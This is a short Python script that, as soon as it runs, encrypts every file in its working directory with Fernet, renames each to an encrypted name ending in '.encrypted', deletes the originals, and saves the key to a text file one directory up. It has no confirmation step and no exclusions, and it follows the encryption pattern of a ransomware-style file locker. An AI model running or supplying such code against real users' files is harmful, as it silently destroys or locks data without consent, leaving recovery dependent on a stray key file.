import cryptography.fernet as fernet
import string
import os
import random

#classes
def encrypt_file(key):                                              #encrypts every file in the directory of the script location
    
    f = fernet.Fernet(key) 

    current_dir = os.getcwd()
    for file in os.listdir(current_dir):                            #for loop to go through every file in the directory
        with open(file, 'rb') as input_file:
            input_data = input_file.read()                          #imports the data from the file
        encrypted_data = f.encrypt(input_data)                      #imports the encrypted data to the new file
        outFileName = nameEncrypter(file, key)
        with open(outFileName, 'wb') as output_file:
            output_file.write(encrypted_data)                       #ouputs the file
        os.remove(file)                                             #removes the old unencrypted files

    return key

def saveKey(key):                                                   #save's the keys file
    key_dir = os.path.join(os.getcwd(), '..')                       #imports the local path goes back one directory to the parent
    key_file = os.path.join(key_dir, 'key.txt')                     #creates the key file's name         
    with open(key_file, 'wb') as file_out: 
        file_out.write(key)                                         #outputs the file
    print('Key saved successfully.')

def fileNamer(length):                                              #creates a random name for the file at a random length
    letters = string.ascii_lowercase
    name = ''.join(random.choice(letters) for i in range(length))
    return name 

def nameEncrypter(file_name, key):                                              #checks if the file's name is unique
    f = fernet.Fernet(key)
    encrypted_name = f.encrypt(file_name.encode()).decode()
    return encrypted_name + ".encrypted"


# main
nameLength = random.randint(8,20)                                   
key = fernet.Fernet.generate_key()
encrypt_file(key)
saveKey(key)


print("Encryption complete!")
